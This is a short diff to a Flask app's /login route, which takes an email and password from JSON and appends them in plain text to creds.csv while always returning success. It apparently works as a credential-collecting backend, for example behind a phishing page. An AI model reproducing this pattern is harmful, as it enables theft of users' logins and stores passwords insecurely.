@@ -9,11 +9,12 @@ def index():
 
 @app.route("/login", methods = ["POST"])
 def login():
-  username = request.json.get("username")
-  password = request.json.get("password")
+  email = request.json.get("email")
+  pwrd = request.json.get("pwrd")
   with open("creds.csv", "a+") as f:
     csv_writer = csv.writer(f)
-    csv_writer.writerow([username, password])
+    csv_writer.writerow([email, pwrd])
+    f.close()
 
   return jsonify({
     "status": "success"
